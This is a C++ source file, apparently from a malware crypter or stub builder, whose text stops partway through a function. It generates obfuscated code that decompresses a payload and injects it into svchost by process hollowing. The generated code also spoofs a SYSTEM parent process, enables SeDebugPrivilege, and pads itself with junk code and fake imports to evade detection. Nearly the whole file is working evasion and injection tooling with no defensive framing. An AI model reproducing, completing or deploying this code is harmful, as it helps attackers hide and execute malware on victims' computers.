#include <windows.h>
#include "mCode.h"
#include "mFunction.h"
#include "globals.h"
#include "mCodeLines.h"
#include "mRandom.h"
#include "StubFunctions.h"

mRandom gRand;

static constexpr DWORD gBufferSizes[10] = {0x1000, 0x2000, 0x3000, 0x4000, 0x5000, 0x6000, 0x7000, 0x8000, 0x9000, 0x10000};

#define _BEGIN_FUNC() _lines.add("MessageBoxA(0, __FUNCTION__, \"Begin\", 0);")
#define _END_FUNC() _lines.add("MessageBoxA(0, __FUNCTION__, \"End\", 0);")

void StubFunctions::Build::Declaration::runPayload(mFunction *_func)
{
	_func->set_name("runPayload");
	_func->set_return(MVT_UINT32);
	_func->set_convention(FC_CDECL);
	_func->add_formal(MVT_LPVOID, "_data", MVF_INITIALIZED | MVF_UNKNOWN_VALUE, 0);
	_func->add_formal(MVT_UINT32, "_size", MVF_INITIALIZED | MVF_UNKNOWN_VALUE, 0);
	_func->add_formal(MVT_LPVOID, "_decompressFunc", MVF_INITIALIZED | MVF_UNKNOWN_VALUE, 0);
}

void StubFunctions::Build::Body::runPayload(mFunction* _func)
{
	auto _block = _func->generate(config.code.blocks.count.min, config.code.blocks.count.max, IS_PROC);
 	auto _locals = _func->get_code_generator()->get_locals();
 	mCodeLines _lines(_func->get_code_generator(), _block);
 	
  	_locals->add_custom_ex("QaPsafe_depack", "_aPsafe_depack", "(QaPsafe_depack)_decompressFunc");
  	_locals->add_custom_ex("LPBYTE", "_decBuffer", "new BYTE[_size * 10]");
  	_locals->add_custom_ex("DWORD", "_temp", "0");
 
 	// to avoid compiler optimizations we have to use our fake array imports
  	_lines.add("_temp = COMCTL3295_Array[0];");
  	_lines.add("_temp = KERNEL32221_Array[0];");
  	_lines.add("_temp = USER3221_Array[0];");
  	_lines.add("_temp = GDI32121_Array[0];");
  	_lines.add("_temp = comdlg3218_Array[0];");
  	_lines.add("_temp = ADVAPI32214_Array[0];");
	
	_BEGIN_FUNC();

  	_lines.add("mem_set(_decBuffer, 0x0, _size * 10);");
  	_lines.add("_aPsafe_depack(_data, _size * 10, _decBuffer, _size);");
 
 	_lines.add("createHollowedProcess(OBFUSCATED(\"svchost\"), _decBuffer);");

	_END_FUNC();
}

void StubFunctions::Build::Declaration::createHollowedProcess(mFunction* _func)
{
	_func->set_name("createHollowedProcess");
	_func->set_return(MVT_VOID);
	_func->set_convention(FC_CDECL);
	_func->add_formal(MVT_PCCH, "_destCmdName", MVF_INITIALIZED | MVF_UNKNOWN_VALUE, 0);
	_func->add_formal(MVT_PUINT8, "_payload", MVF_INITIALIZED | MVF_UNKNOWN_VALUE, 0);
}

void StubFunctions::Build::Body::createHollowedProcess(mFunction* _func)
{
	auto _block = _func->generate(config.code.blocks.count.min, config.code.blocks.count.max, IS_PROC);
	auto _locals = _func->get_code_generator()->get_locals();
	mCodeLines _lines(_func->get_code_generator(), _block);

	_locals->add_custom_ex("PROCESS_INFORMATION", "_processInfo", "{}"); //ok
	_locals->add_custom_ex("auto", "_basicInfo", "(PPROCESS_BASIC_INFORMATION)pRtlAllocateHeap(pGetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PROCESS_BASIC_INFORMATION))");
	_locals->add_custom_ex("auto", "_peb", "(PPEB)pRtlAllocateHeap(pGetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PEB))");
	_locals->add_custom_ex("auto", "_buffer", "(LPBYTE)pRtlAllocateHeap(pGetProcessHeap(), HEAP_ZERO_MEMORY, BUFFER_SIZE)");
	_locals->add_custom_ex("auto", "_remoteImage", "(PLOADED_IMAGE)pRtlAllocateHeap(pGetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(LOADED_IMAGE))");
	_locals->add_custom_ex("auto", "_sourceImage", "(PLOADED_IMAGE)pRtlAllocateHeap(pGetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(LOADED_IMAGE))");
	_locals->add_custom_ex("BOOL", "_ret", "0");
	_locals->add_custom_ex("NTSTATUS", "_status", "STATUS_SUCCESS");
	_locals->add_custom_ex("PIMAGE_DOS_HEADER", "_remoteDosHeader", "nullptr");
	_locals->add_custom_ex("PIMAGE_DOS_HEADER", "_sourceDosHeader", "nullptr");
	_locals->add_custom_ex("PBASE_RELOCATION_BLOCK", "_blockHeader", "nullptr");
	_locals->add_custom_ex("PBASE_RELOCATION_ENTRY", "_blocks", "nullptr");
	_locals->add_custom_ex("LPVOID", "_remoteMemory", "nullptr");
	_locals->add_custom_ex("LPVOID", "_sectionDest", "nullptr");
	_locals->add_custom_ex("LPCSTR", "_sectionName", "OBFUSCATED(\".reloc\")");
	_locals->add_custom_ex("ULONG_PTR", "_delta", "0");
	_locals->add_custom_ex("ULONG_PTR", "_relocAddr", "0");
	_locals->add_custom_ex("ULONG_PTR", "_offset", "0");
	_locals->add_custom_ex("ULONG_PTR", "_filedAddress", "0");
	_locals->add_custom_ex("ULONG_PTR", "_tempBuffer", "0");
	_locals->add_custom_ex("ULONG_PTR", "_entryPoint", "0");
	_locals->add_custom_ex("ULONG", "_entryCount", "0");
	_locals->add_custom_ex("IMAGE_DATA_DIRECTORY", "_relocData", "{}");
	_locals->add_custom_ex("CONTEXT", "_context", "{}");
	_BEGIN_FUNC();
	CODE_BLOCK_IF_NO_TRASH("if (_basicInfo == nullptr || _peb == nullptr || _buffer == nullptr || _remoteImage == nullptr || _sourceImage == nullptr)", "return;");

	_lines.add("_ret = (BOOL)createProcessAndSpoofParent(_destCmdName, &_processInfo);");

	CODE_BLOCK_IF_NO_TRASH("if (_ret == 0 || _processInfo.hProcess == INVALID_HANDLE_VALUE)", "return;");

	_lines.add("_status = (NTSTATUS)pZwQueryInformationProcess(_processInfo.hProcess, 0, _basicInfo, sizeof(PROCESS_BASIC_INFORMATION), &_ret);");

	CODE_BLOCK_IF_NO_TRASH("if (_status != STATUS_SUCCESS)", "pLocalFree(_basicInfo); pLocalFree(_peb); pLocalFree(_buffer); pLocalFree(_remoteImage); pLocalFree(_sourceImage); pResumeThread(_processInfo.hThread); return;");

	_lines.add("_ret = (BOOL)pReadProcessMemory(_processInfo.hProcess, (LPCVOID)_basicInfo->PebBaseAddress, _peb, sizeof(PEB), (LPVOID)0);");
	
	CODE_BLOCK_IF_NO_TRASH("if (!_ret)", "pLocalFree(_basicInfo); pLocalFree(_peb); pLocalFree(_buffer); pLocalFree(_remoteImage); pLocalFree(_sourceImage); pResumeThread(_processInfo.hThread); return;");
	
	_lines.add("_ret = (BOOL)pReadProcessMemory(_processInfo.hProcess, _peb->ImageBaseAddress, _buffer, BUFFER_SIZE, (LPVOID)0);");
	
	CODE_BLOCK_IF_NO_TRASH("if (!_ret)", "pLocalFree(_basicInfo); pLocalFree(_peb); pLocalFree(_buffer); pLocalFree(_remoteImage); pLocalFree(_sourceImage); pResumeThread(_processInfo.hThread); return;");

	_lines.add("_remoteDosHeader = (PIMAGE_DOS_HEADER)_buffer;");

	CODE_BLOCK_IF_NO_TRASH("if (_remoteDosHeader->e_magic != IMAGE_DOS_SIGNATURE)", "pLocalFree(_basicInfo); pLocalFree(_peb); pLocalFree(_buffer); pLocalFree(_remoteImage); pLocalFree(_sourceImage); pResumeThread(_processInfo.hThread); return;");

	_lines.add("_remoteImage->FileHeader = (PIMAGE_NT_HEADERS)(_buffer + _remoteDosHeader->e_lfanew);");

	CODE_BLOCK_IF_NO_TRASH("if (_remoteImage->FileHeader->Signature != IMAGE_NT_SIGNATURE)", "pLocalFree(_basicInfo); pLocalFree(_peb); pLocalFree(_buffer); pLocalFree(_remoteImage); pLocalFree(_sourceImage); pResumeThread(_processInfo.hThread); return;");

	_lines.add("_remoteImage->NumberOfSections = _remoteImage->FileHeader->FileHeader.NumberOfSections;");
	_lines.add("_remoteImage->Sections = (PIMAGE_SECTION_HEADER)(_buffer + _remoteDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS));");
	_lines.add("_sourceDosHeader = (PIMAGE_DOS_HEADER)_payload;");

	CODE_BLOCK_IF_NO_TRASH("if (_sourceDosHeader->e_magic != IMAGE_DOS_SIGNATURE)", "pLocalFree(_basicInfo); pLocalFree(_peb); pLocalFree(_buffer); pLocalFree(_remoteImage); pLocalFree(_sourceImage); pResumeThread(_processInfo.hThread); return;");

	_lines.add("_sourceImage->FileHeader = (PIMAGE_NT_HEADERS)(_payload + _sourceDosHeader->e_lfanew);");

	CODE_BLOCK_IF_NO_TRASH("if (_sourceImage->FileHeader->Signature != IMAGE_NT_SIGNATURE)", "pLocalFree(_basicInfo); pLocalFree(_peb); pLocalFree(_buffer); pLocalFree(_remoteImage); pLocalFree(_sourceImage); pResumeThread(_processInfo.hThread); return;");

	_lines.add("_sourceImage->NumberOfSections = _remoteImage->FileHeader->FileHeader.NumberOfSections;");
	_lines.add("_sourceImage->Sections = (PIMAGE_SECTION_HEADER)(_payload + _sourceDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS));");
	_lines.add("_ret = (DWORD)pZwUnmapViewOfSection(_processInfo.hProcess, _peb->ImageBaseAddress);");

	CODE_BLOCK_IF_NO_TRASH("if (_ret != STATUS_SUCCESS)", "pLocalFree(_basicInfo); pLocalFree(_peb); pLocalFree(_buffer); pLocalFree(_remoteImage); pLocalFree(_sourceImage); pResumeThread(_processInfo.hThread); return;");

	_lines.add("_remoteMemory = (LPVOID)pVirtualAllocEx(_processInfo.hProcess, _peb->ImageBaseAddress, _sourceImage->FileHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);");
	
	CODE_BLOCK_IF_NO_TRASH("if (!_remoteMemory)", "pLocalFree(_basicInfo); pLocalFree(_peb); pLocalFree(_buffer); pLocalFree(_remoteImage); pLocalFree(_sourceImage); pResumeThread(_processInfo.hThread); return;");

	_lines.add("_delta = (ULONG_PTR)_peb->ImageBaseAddress - _sourceImage->FileHeader->OptionalHeader.ImageBase;");
	_lines.add("_sourceImage->FileHeader->OptionalHeader.ImageBase = (ULONG_PTR)_peb->ImageBaseAddress;");
	_lines.add("_ret = (BOOL)pWriteProcessMemory(_processInfo.hProcess, _peb->ImageBaseAddress, _payload, _sourceImage->FileHeader->OptionalHeader.SizeOfHeaders, (LPVOID)0);");
	
	CODE_BLOCK_IF_NO_TRASH("if (!_ret)", "pLocalFree(_basicInfo); pLocalFree(_peb); pLocalFree(_buffer); pLocalFree(_remoteImage); pLocalFree(_sourceImage); pResumeThread(_processInfo.hThread); return;");

	_lines.set_trash_flags(IS_LOOP | DO_NOT_CHANGE_PARENT);
	{
		auto _loop = _lines.add_ex(MCODELINE_FLAG_NO_TRASH, "for (int i = 0; i < _sourceImage->NumberOfSections; i++)");

		_lines.push();
		{
			CODE_BLOCK_IF_NO_TRASH("if (!_sourceImage->Sections[i].PointerToRawData)", "continue;");

			_lines.add("_sectionDest = (PVOID)((ULONG_PTR)_peb->ImageBaseAddress + _sourceImage->Sections[i].VirtualAddress);");
			_lines.add("_ret = (BOOL)pWriteProcessMemory(_processInfo.hProcess, _sectionDest, &_payload[_sourceImage->Sections[i].PointerToRawData], _sourceImage->Sections[i].SizeOfRawData, (LPVOID)0);");

			CODE_BLOCK_IF_NO_TRASH("if (!_ret)", "return;");
		}
		_lines.pop();

		for (int i = 0; i < 2; i++)
		{
			_func->get_code_generator()->emulate_block(_loop, false);
		}

		_lines.set_trash_flags(NULL);
	}

	_lines.set_trash_flags(IS_IF | DO_NOT_CHANGE_PARENT);
	{
		auto _blockIf = _lines.add_ex(MCODELINE_FLAG_NO_TRASH, "if (_delta)");

		_lines.push();
		{
			_lines.set_trash_flags(IS_LOOP | DO_NOT_CHANGE_PARENT);
			{
				auto _loop = _lines.add_ex(MCODELINE_FLAG_NO_TRASH, "for (int i = 0; i < _sourceImage->NumberOfSections; i++)");

				_lines.push();
				{
					CODE_BLOCK_IF_NO_TRASH("if ((SIZE_T)pRtlCompareMemory(_sourceImage->Sections[i].Name, _sectionName, 6) != 6)", "continue;");

					_lines.add("_relocAddr = _sourceImage->Sections[i].PointerToRawData;");
					_lines.add("_offset = 0;");
					_lines.add("_relocData = _sourceImage->FileHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];");

					_lines.set_trash_flags(IS_LOOP | DO_NOT_CHANGE_PARENT);
					{
						auto _loop2 = _lines.add_ex(MCODELINE_FLAG_NO_TRASH, "while (_offset < _relocData.Size)");

						_lines.push();
						{
							_lines.add("_blockHeader = (PBASE_RELOCATION_BLOCK)&_payload[_relocAddr + _offset];");
							_lines.add("_offset += sizeof(BASE_RELOCATION_BLOCK);");
							_lines.add("_entryCount = CountRelocationEntries(_blockHeader->BlockSize);");
							_lines.add("_blocks = (PBASE_RELOCATION_ENTRY)&_payload[_relocAddr + _offset];");

							_lines.set_trash_flags(IS_LOOP | DO_NOT_CHANGE_PARENT);
							{
								auto _loop3 = _lines.add_ex(MCODELINE_FLAG_NO_TRASH, "for (int y = 0; y < _entryCount; y++)");

								_lines.push();
								{
									_lines.add("_offset += sizeof(BASE_RELOCATION_ENTRY);");

									CODE_BLOCK_IF_NO_TRASH("if (_blocks[y].Type == 0)", "continue;");

									_lines.add("_filedAddress = _blockHeader->PageAddress + _blocks[y].Offset;");
									_lines.add("_tempBuffer = 0;");
									_lines.add("pReadProcessMemory(_processInfo.hProcess, (PVOID)((ULONG_PTR)_peb->ImageBaseAddress + _filedAddress), &_tempBuffer, sizeof(ULONG_PTR), (LPVOID)0);");
									_lines.add("_tempBuffer += _delta;");
									_lines.add("_ret = (BOOL)pWriteProcessMemory(_processInfo.hProcess, (PVOID)((ULONG_PTR)_peb->ImageBaseAddress + _filedAddress), &_tempBuffer, sizeof(ULONG_PTR), (LPVOID)0);");
									
									CODE_BLOCK_IF_NO_TRASH("if (!_ret)", "continue;");
								}
								_lines.pop();

								for (int i = 0; i < 2; i++)
								{
									_func->get_code_generator()->emulate_block(_loop3, false);
								}

								_lines.set_trash_flags(NULL);
							}
						}
						_lines.pop();
						_lines.add("break;");

						for (int i = 0; i < 2; i++)
						{
							_func->get_code_generator()->emulate_block(_loop2, false);
						}

						_lines.set_trash_flags(NULL);
					}
				}
				_lines.pop();

				for (int i = 0; i < 2; i++)
				{
					_func->get_code_generator()->emulate_block(_loop, false);
				}

				_lines.set_trash_flags(NULL);
			}
		}
		_lines.pop();

		for (int i = 0; i < 2; i++)
		{
			_func->get_code_generator()->emulate_block(_blockIf, false);
		}

		_lines.set_trash_flags(NULL);
	}
	
	_lines.add("_entryPoint = (ULONG_PTR)_peb->ImageBaseAddress + _sourceImage->FileHeader->OptionalHeader.AddressOfEntryPoint;");
	_lines.add("_context.ContextFlags = CONTEXT_INTEGER;");

	CODE_BLOCK_IF_NO_TRASH("if (!(BOOL)pGetThreadContext(_processInfo.hThread, &_context))", "pLocalFree(_basicInfo); pLocalFree(_peb); pLocalFree(_buffer); pLocalFree(_remoteImage); pLocalFree(_sourceImage); pResumeThread(_processInfo.hThread); return;");

#if defined(_WIN64)
	_lines.add("_context.Rcx = _entryPoint;");
#else
	_lines.add("_context.Eax = _entryPoint;");
#endif

	CODE_BLOCK_IF_NO_TRASH("if (!(BOOL)pSetThreadContext(_processInfo.hThread, &_context))", "pLocalFree(_basicInfo); pLocalFree(_peb); pLocalFree(_buffer); pLocalFree(_remoteImage); pLocalFree(_sourceImage); pResumeThread(_processInfo.hThread); return;");

	_lines.add("setDefaultCurrentDirectory(_processInfo.hProcess, _peb);");

	CODE_BLOCK_IF_NO_TRASH("if (!(BOOL)pResumeThread(_processInfo.hThread))", "return;");

	_lines.add("pLocalFree(_basicInfo); pLocalFree(_peb); pLocalFree(_buffer); pLocalFree(_remoteImage); pLocalFree(_sourceImage);");

	_END_FUNC();
}

void StubFunctions::Build::Declaration::createProcessAndSpoofParent(mFunction* _func)
{
	_func->set_name("createProcessAndSpoofParent");
	_func->set_return(MVT_BOOL);
	_func->set_convention(FC_CDECL);
	_func->add_formal(MVT_PCCH, "_destCmdLine", MVF_INITIALIZED | MVF_UNKNOWN_VALUE, 0);
	_func->add_formal(MVT_PROCESS_INFORMATION, "*_processInfo", MVF_INITIALIZED | MVF_UNKNOWN_VALUE, 0);
}

void StubFunctions::Build::Body::createProcessAndSpoofParent(mFunction* _func)
{
	auto _block = _func->generate(config.code.blocks.count.min, config.code.blocks.count.max, IS_PROC);
	auto _locals = _func->get_code_generator()->get_locals();
	mCodeLines _lines(_func->get_code_generator(), _block);

	_locals->add_custom_ex("STARTUPINFOEXA", "_startupInfoEx", "{ sizeof(STARTUPINFOEXA) }");
	_locals->add_custom_ex("SIZE_T", "_attributeListSize", "0");
	_locals->add_custom_ex("PPROC_THREAD_ATTRIBUTE_LIST", "_attributeList", "nullptr");
	_locals->add_custom_ex("HANDLE", "_parentProcess", "INVALID_HANDLE_VALUE");
	_locals->add_custom_ex("DWORD", "_parentId", "0");

	_BEGIN_FUNC();

	_lines.set_trash_flags(IS_IF | DO_NOT_CHANGE_PARENT);
	{
		auto _blockIf2 = _lines.add_ex(MCODELINE_FLAG_NO_TRASH, "if (!adjustTokenCurrentProcess())");

		_lines.push();
		{
			_lines.add_ex(MCODELINE_FLAG_NO_TRASH, "_startupInfoEx.StartupInfo.cb = sizeof(STARTUPINFOA);");

			CODE_BLOCK_IF("if (!(BOOL)CreateProcessA(0, (LPSTR)_destCmdLine, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &_startupInfoEx.StartupInfo, _processInfo))", "return 0;");
			
			_lines.add_ex(MCODELINE_FLAG_NO_TRASH, "return 1;");
		}
		_lines.pop();

		for (int i = 0; i < 2; i++)
		{
			_func->get_code_generator()->emulate_block(_blockIf2, false);
		}

		_lines.set_trash_flags(NULL);
	}

	_lines.add("InitializeProcThreadAttributeList(0, 1, 0, &_attributeListSize);");
	_lines.add("_attributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, _attributeListSize);");

	CODE_BLOCK_IF_NO_TRASH("if (_attributeList == nullptr)", "return 0;");
	CODE_BLOCK_IF_NO_TRASH("if (!InitializeProcThreadAttributeList(_attributeList, 1, 0, &_attributeListSize))", "return 0;");

	_lines.add("_parentId = getSvchostPid();");

	_lines.set_trash_flags(IS_IF | DO_NOT_CHANGE_PARENT);
	{
		auto _blockIf2 = _lines.add_ex(MCODELINE_FLAG_NO_TRASH, "if (_parentId == 0)");

		_lines.push();
		{
			_lines.add_ex(MCODELINE_FLAG_NO_TRASH, "_startupInfoEx.StartupInfo.cb = sizeof(STARTUPINFOA);");

			CODE_BLOCK_IF("if ((BOOL)CreateProcessA(0, (LPSTR)_destCmdLine, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &_startupInfoEx.StartupInfo, _processInfo))", "return 1;");
		
			_lines.add_ex(MCODELINE_FLAG_NO_TRASH, "return 1;");
		}
		_lines.pop();

		for (int i = 0; i < 2; i++)
		{
			_func->get_code_generator()->emulate_block(_blockIf2, false);
		}

		_lines.set_trash_flags(NULL);
	}

	_lines.add("_parentProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, _parentId);");

	CODE_BLOCK_IF_NO_TRASH("if (!UpdateProcThreadAttribute(_attributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &_parentProcess, sizeof(HANDLE), 0, 0))", "return 0;");

	_lines.add("_startupInfoEx.lpAttributeList = _attributeList;");

	CODE_BLOCK_IF_NO_TRASH("if (!(BOOL)CreateProcessA(0, (LPSTR)_destCmdLine, 0, 0, 0, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, 0, 0, &_startupInfoEx.StartupInfo, _processInfo))", "return 0;");

	_lines.add("DeleteProcThreadAttributeList(_attributeList);");
	_lines.add("CloseHandle(_parentProcess);");

	_END_FUNC();

	_lines.add("return 1;");
}

void StubFunctions::Build::Declaration::adjustTokenCurrentProcess(mFunction* _func)
{
	_func->set_name("adjustTokenCurrentProcess");
	_func->set_return(MVT_BOOL);
	_func->set_convention(FC_CDECL);
}

void StubFunctions::Build::Body::adjustTokenCurrentProcess(mFunction* _func)
{
	auto _block = _func->generate(config.code.blocks.count.min, config.code.blocks.count.max, IS_PROC);
	auto _locals = _func->get_code_generator()->get_locals();
	mCodeLines _lines(_func->get_code_generator(), _block);

	_locals->add_custom_ex("HANDLE", "_token", "INVALID_HANDLE_VALUE");
	_locals->add_custom_ex("TOKEN_PRIVILEGES", "_tokenPrivileges", "{}");

	_BEGIN_FUNC();

	CODE_BLOCK_IF_NO_TRASH("if (!(BOOL)OpenProcessToken(pGetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &_token))", "return 0;");
	CODE_BLOCK_IF_NO_TRASH("if (!(BOOL)LookupPrivilegeValueA(0, OBFUSCATED(\"SeDebugPrivilege\"), &_tokenPrivileges.Privileges[0].Luid))", "CloseHandle(_token); return 0;");

	_lines.add("_tokenPrivileges.PrivilegeCount = 1;");
	_lines.add("_tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;");

	CODE_BLOCK_IF_NO_TRASH("if (!(BOOL)AdjustTokenPrivileges(_token, 0, &_tokenPrivileges, sizeof(_tokenPrivileges), 0, 0))", "CloseHandle(_token); return 0;");
	
	_lines.add("CloseHandle(_token);");

	CODE_BLOCK_IF_NO_TRASH("if (NtCurrentTeb()->LastErrorValue == ERROR_NOT_ALL_ASSIGNED)", "return 0;");

	_END_FUNC();

	_lines.add("return 1;");
}

void StubFunctions::Build::Declaration::getSvchostPid(mFunction* _func)
{
	_func->set_name("getSvchostPid");
	_func->set_return(MVT_UINT32);
	_func->set_convention(FC_CDECL);
}

void StubFunctions::Build::Body::getSvchostPid(mFunction* _func)
{
	auto _block = _func->generate(config.code.blocks.count.min, config.code.blocks.count.max, IS_PROC);
	auto _locals = _func->get_code_generator()->get_locals();
	mCodeLines _lines(_func->get_code_generator(), _block);

	_locals->add_custom_ex("NTSTATUS", "_status", "STATUS_INFO_LENGTH_MISMATCH");

	auto _randNumber = gRand.get_equal(0, 9);
	char _temp[260] = {};

	sprintf(_temp, "0x%X", gBufferSizes[_randNumber]);

	_locals->add_custom_ex("ULONG", "_bufferSize", _temp);
	_locals->add_custom_ex("PVOID", "_buffer", "nullptr");
	_locals->add_custom_ex("PSYSTEM_PROCESS_INFORMATION", "_processes", "nullptr");
	_locals->add_custom_ex("LPWSTR", "_processNameW", "nullptr");
	_locals->add_custom_ex("char", "_processName[MAX_PATH]", "{}");
	_locals->add_custom_ex("HANDLE", "_handle", "INVALID_HANDLE_VALUE");
	_locals->add_custom_ex("PCHAR", "_sid", "nullptr");
	_locals->add_custom_ex("BOOL", "_ret", "0");
	_locals->add_custom_ex("DWORD", "_pid", "0");

	_BEGIN_FUNC();

	_lines.set_trash_flags(IS_LOOP | DO_NOT_CHANGE_PARENT);
	{
		auto _loop = _lines.add_ex(MCODELINE_FLAG_NO_TRASH, "while (_status == STATUS_INFO_LENGTH_MISMATCH)");

		_lines.push();
		{
			CODE_BLOCK_IF_NO_TRASH("if (_buffer = pRtlAllocateHeap(pGetProcessHeap(), HEAP_ZERO_MEMORY, _bufferSize); _buffer == nullptr)", "return 0;");

			_lines.add("_status = (NTSTATUS)pZwQuerySystemInformation(5, _buffer, _bufferSize, 0);");

			CODE_BLOCK_IF_NO_TRASH("if (_status == STATUS_INFO_LENGTH_MISMATCH)", "pLocalFree(_buffer); _bufferSize *= 2;");
			CODE_BLOCK_IF_NO_TRASH("if (_status != STATUS_INFO_LENGTH_MISMATCH && _status != STATUS_SUCCESS)", "pLocalFree(_buffer); return 0;");
		}
		_lines.pop();

		for (int i = 0; i < 2; i++)
		{
			_func->get_code_generator()->emulate_block(_loop, false);
		}

		_lines.set_trash_flags(NULL);
	}

	_lines.add("_processes = (PSYSTEM_PROCESS_INFORMATION)_buffer;");

	_lines.set_trash_flags(IS_LOOP | DO_NOT_CHANGE_PARENT);
	{
		auto _loop = _lines.add_ex(MCODELINE_FLAG_NO_TRASH, "while (true)");

		_lines.push();
		{
			_lines.add("_processNameW = _processes->ImageName.Buffer;");

			CODE_BLOCK_IF_NO_TRASH("if (_processNameW == nullptr)", "_processNameW = L\"\\00\";");

			_lines.add("pWideCharToMultiByte(CP_ACP, 0, _processNameW, -1, _processName, MAX_PATH, (LPCCH)0, (LPBOOL)0);");
			_lines.add("_handle = pOpenProcess(PROCESS_QUERY_INFORMATION, 0, (DWORD)_processes->UniqueProcessId);");

			_lines.set_trash_flags(IS_IF | DO_NOT_CHANGE_PARENT);
			{
				auto _blockIf1 = _lines.add_ex(MCODELINE_FLAG_NO_TRASH, "if (_ret = getProcessSid(&_handle, &_sid); _ret == 1 && _sid != nullptr)");

				_lines.push();
				{
					_lines.set_trash_flags(IS_IF | DO_NOT_CHANGE_PARENT);
					{
						auto _blockIf2 = _lines.add_ex(MCODELINE_FLAG_NO_TRASH, "if (!lstrcmpiA(_sid, OBFUSCATED(\"S-1-5-18\")) && !lstrcmpiA(_processName, OBFUSCATED(\"svchost.exe\")))");

						_lines.push();
						{
							_lines.add_first(MCODELINE_FLAG_NO_TRASH, "_pid = (DWORD)_processes->UniqueProcessId;");
							_lines.add_ex(MCODELINE_FLAG_NO_TRASH, "pLocalFree(_buffer);");
							_lines.add_ex(MCODELINE_FLAG_NO_TRASH, "pLocalFree((LPVOID)_sid);");
							_END_FUNC();
							_lines.add_ex(MCODELINE_FLAG_NO_TRASH, "return _pid;");
						}
						_lines.pop();

						for (int i = 0; i < 2; i++)
						{
							_func->get_code_generator()->emulate_block(_blockIf2, false);
						}

						_lines.set_trash_flags(NULL);
					}
				}
				_lines.pop();
				_lines.add_ex(MCODELINE_FLAG_NO_TRASH, "pLocalFree((LPVOID)_sid);");

				for (int i = 0; i < 2; i++)
				{
					_func->get_code_generator()->emulate_block(_blockIf1, false);
				}

				_lines.set_trash_flags(NULL);
			}
		}
		_lines.pop();

		for (int i = 0; i < 2; i++)
		{
			_func->get_code_generator()->emulate_block(_loop, false);
		}

		_lines.set_trash_flags(NULL);
	}

	_lines.add("pLocalFree(_buffer);");
	_lines.add("return 0;");
}

void StubFunctions::Build::Declaration::getProcessSid(mFunction* _func)
{
	_func->set_name("getProcessSid");
	_func->set_return(MVT_BOOL);
	_func->set_convention(FC_CDECL);
	_func->add_formal(MVT_HANDLE, "*_remoteProcess", MVF_INITIALIZED | MVF_UNKNOWN_VALUE, 0);
	_func->add_formal(MVT_PCHAR, "*_name", MVF_INITIALIZED | MVF_UNKNOWN_VALUE, 0);
}

void StubFunctions::Build::Body::getProcessSid(mFunction* _func)
{
	auto _block = _func->generate(config.code.blocks.count.min, config.code.blocks.count.max, IS_PROC);
	auto _locals = _func->get_code_generator()->get_locals();
	mCodeLines _lines(_func->get_code_generator(), _block);

	_locals->add_custom_ex("HANDLE", "_token", "INVALID_HANDLE_VALUE");
	_locals->add_custom_ex("HANDLE", "_process", "INVALID_HANDLE_VALUE");
	_locals->add_custom_ex("char", "_tokenBuffer[MAX_PATH]", "{}");
	_locals->add_custom_ex("PTOKEN_USER", "_tokenUser", "nullptr");
	_locals->add_custom_ex("DWORD", "_nameLen", "MAX_PATH");

	//_BEGIN_FUNC();

	_lines.add("_process = _remoteProcess ? *_remoteProcess : pGetCurrentProcess();");
	_lines.add("_tokenUser = (PTOKEN_USER)_tokenBuffer;");

	CODE_BLOCK_IF_NO_TRASH("if (!pOpenProcessToken(_process, TOKEN_QUERY, &_token))", "return 0;");
	CODE_BLOCK_IF_NO_TRASH("if (!pGetTokenInformation(_token, TokenUser, _tokenUser, MAX_PATH, &_nameLen))", "pCloseHandle(_token); return 0;");

	_lines.add("*_name = (LPSTR)pRtlAllocateHeap(pGetProcessHeap(), HEAP_ZERO_MEMORY, MAX_PATH);");

	CODE_BLOCK_IF_NO_TRASH("if (!(BOOL)pConvertSidToStringSidA(_tokenUser->User.Sid, _name))", "pCloseHandle(_token); pLocalFree((LPVOID)*_name); return 0;")

	_lines.add("pCloseHandle(_token);");
	//_END_FUNC();
	_lines.add("return 1;");
}

void StubFunctions::Build::Declaration::setDefaultCurrentDirectory(mFunction* _func)
{
	_func->set_name("setDefaultCurrentDirectory");
	_func->set_return(MVT_BOOL);
	_func->set_convention(FC_CDECL);
	_func->add_formal(MVT_HANDLE, "_process", MVF_INITIALIZED | MVF_UNKNOWN_VALUE, 0);
	_func->add_formal(MVT_PEB, "*_peb", MVF_INITIALIZED | MVF_UNKNOWN_VALUE, 0);
}

void StubFunctions::Build::Body::setDefaultCurrentDirectory(mFunction* _func)
{
	auto _block = _func->generate(config.code.blocks.count.min, config.code.blocks.count.max, IS_PROC);
	auto _locals = _func->get_code_generator()->get_locals();
	mCodeLines _lines(_func->get_code_generator(), _block);

	_locals->add_custom_ex("RTL_USER_PROCESS_PARAMETERS", "_params", "{}");
	_locals->add_custom_ex("BOOL", "_ret", "0");
	_locals->add_custom_ex("LPWCH", "_childCurrentDir", "nullptr");
	_locals->add_custom_ex("LPWCH", "_childPathName", "nullptr");
	_locals->add_custom_ex("int", "_currentPos", "0");
	_locals->add_custom_ex("int", "_lastSlash", "0");
	_locals->add_custom_ex("int", "_newCurDirSize", "0");
	_locals->add_custom_ex("size_t", "_lengthCurDirOffset", "0");
	_locals->add_custom_ex("LPVOID", "_lengthCurDirAddr", "nullptr");

	_BEGIN_FUNC();

	_lines.add("_ret = (BOOL)pReadProcessMemory(_process, (LPCVOID)_peb->ProcessParameters, &_params, sizeof(_params), (LPVOID)0);");

	CODE_BLOCK_IF_NO_TRASH("if (_ret == 0)", "return 0;");

	_lines.add("_childCurrentDir = (WCHAR*)pRtlAllocateHeap(pGetProcessHeap(), HEAP_ZERO_MEMORY, _params.CurrentDirectory.DosPath.Length + 1);");
